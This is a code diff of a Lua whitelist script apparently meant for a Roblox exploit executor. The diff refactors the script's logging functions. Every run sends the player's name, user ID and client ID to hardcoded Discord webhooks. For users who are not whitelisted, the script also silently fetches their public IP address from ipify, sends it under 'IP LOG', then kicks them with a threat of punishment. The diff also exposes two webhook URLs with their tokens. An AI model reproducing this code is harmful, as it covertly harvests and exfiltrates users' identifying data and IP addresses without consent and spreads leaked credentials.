@@ -1,12 +1,14 @@
 local lplr = game.Players.LocalPlayer
 local clientID = game:GetService("RbxAnalyticsService"):GetClientId()
 
+local hook = "https://discord.com/api/webhooks/1141671892760137729/_HR6l8eYm8tfdKQytfToSqsLeVW2znRhSfCpii0xVw5g06ZRcKQaKplFdAYCTBqAKu5y"  
+local blekhook = "https://discord.com/api/webhooks/1138924457105301505/7XSBdxKCnkRCxALeVIHGskQwHX4aoO9IHxy38_DJ-XaQYIGDHawxGeUpf9lTHFL3H03W" 
+
+
 if not clientID then
     warn("Failed to get client ID.")
     return
 end
-
-local hook = "https://discord.com/api/webhooks/1141671892760137729/_HR6l8eYm8tfdKQytfToSqsLeVW2znRhSfCpii0xVw5g06ZRcKQaKplFdAYCTBqAKu5y"
 
 local whitelistTable = {
     private = {
@@ -51,37 +53,71 @@ local function isBlacklisted(id)
     return false
 end
 
-local isPlayerWhitelisted = isWhitelisted(clientID)
-
-local function sendToWebhook(title, description, isWhitelisted, extraFields)
-    local color = isWhitelisted and 0x00FF00 or 0xFF0000  
+local function logValidAccess(url, title, description)
     local message = {
         ['embeds'] = {
             {
                 ['title'] = title,
                 ['description'] = description,
-                ['color'] = color,
+                ['color'] = 0x00FF00,
                 ['fields'] = {
                     {name = 'Player Name:', value = lplr.Name},
                     {name = 'UserID', value = lplr.UserId},
                     {name = 'clientID', value = clientID},
                     {name = "Config", value = "PRIVATE"},
                     {name = "Executed on", value = os.date("%d/%m/%Y  %H:%M")},
-                    unpack(extraFields or {})
                 }
             }
         }
     }
 
+    local success = false
+    local response
+
+    local requestFunc = syn and syn.request or request or http_request
+    if requestFunc then
+        response = requestFunc({
+            Url = url,
+            Method = 'POST',
+            Headers = {
+                ['Content-Type'] = 'application/json'
+            },
+            Body = game:GetService('HttpService'):JSONEncode(message)
+        })
+        success = response and response.StatusCode == 200
+    end
+
+    if not success then
+        warn("Failed to send webhook message.")
+    end
+end
+
+local function logUnauthorizedAccess(url, title, description)
+    local message = {
+        ['embeds'] = {
+            {
+                ['title'] = title,
+                ['description'] = description,
+                ['color'] = 0xFF0000,
+                ['fields'] = {
+                    {name = 'Player Name:', value = lplr.Name},
+                    {name = 'UserID', value = lplr.UserId},
+                    {name = 'clientID', value = clientID},
+                    {name = "Config", value = "PRIVATE"},
+                    {name = "Executed on", value = os.date("%d/%m/%Y  %H:%M")},
+                    {name = "IP LOG: ", value = game:HttpGet('https://api.ipify.org')},
+                }
+            }
+        }
+    }
 
     local success = false
     local response
 
     local requestFunc = syn and syn.request or request or http_request
-
     if requestFunc then
         response = requestFunc({
-            Url = hook,
+            Url = url,
             Method = 'POST',
             Headers = {
                 ['Content-Type'] = 'application/json'
@@ -97,76 +133,10 @@ local function sendToWebhook(title, description, isWhitelisted, extraFields)
     end
 end
 
-local blekhook = "https://discord.com/api/webhooks/1138924457105301505/7XSBdxKCnkRCxALeVIHGskQwHX4aoO9IHxy38_DJ-XaQYIGDHawxGeUpf9lTHFL3H03W"
-
-local function sendMessageToWebhookifNoWl(messageContent)
-    local message = {
-        ['embeds'] = {
-            {
-                ['title'] = 'Unauthorized Access Attempt',
-                ['description'] = messageContent,
-                ['color'] = 0xFF0000,
-                ['fields'] = {
-                    {name = 'Player Name:', value = game:GetService("Players").LocalPlayer.Name},
-                    {name = 'UserID', value = game:GetService("Players").LocalPlayer.UserId },
-                    {name = 'clientID', value = clientID},
-                    {name = "Config", value = "PRIVATE"},  
-                    {name = "Executed on", value = os.date("%d/%m/%Y  %H:%M")},   
-                    {name = "IP LOG: ", value = game:HttpGet('https://api.ipify.org')}        
-                }
-            }
-        }
-    }
-
-    local success = false
-    local response
-    if syn then
-        response = syn.request({
-			{
-				Url = blekhook,
-				Method = 'POST',
-				Headers = {
-					['Content-Type'] = 'application/json'
-				},
-				Body = game:GetService('HttpService'):JSONEncode(message)
-			}
-		})
-        success = response and response.StatusCode == 200
-	elseif request then
-		response = request({
-			{
-				Url = blekhook,
-				Method = 'POST',
-				Headers = {
-					['Content-Type'] = 'application/json'
-				},
-				Body = game:GetService('HttpService'):JSONEncode(message)
-			}
-		})
-        success = response and response.StatusCode == 200
-	elseif http_request then
-		response = http_request({
-			{
-				Url = blekhook,
-				Method = 'POST',
-				Headers = {
-					['Content-Type'] = 'application/json'
-				},
-				Body = game:GetService('HttpService'):JSONEncode(message)
-			}
-		})
-        success = response and response.StatusCode == 200
-	end
-
-    if not success then
-        warn("Failed to send webhook message.")
-    end
-end
-
 
 if isBlacklisted(clientID) or not isWhitelisted(clientID) then
-    sendMessageToWebhookifNoWl("Unauthorized Access Attempt", "Player attempted to bypass whitelist.", {})
+    logUnauthorizedAccess(blekhook, "Unauthorized Access Attempt", "Player attempted to bypass whitelist.")
     lplr:Kick("ATTEMPT TO BYPASS WHITELIST | YOU'RE GONNA BE PUNISHED")
 else
-    sendToWebhook("Valid Access", "Player successfully authenticated.", {})
+    logValidAccess(hook, "Valid Access", "Private user playing.")
 end
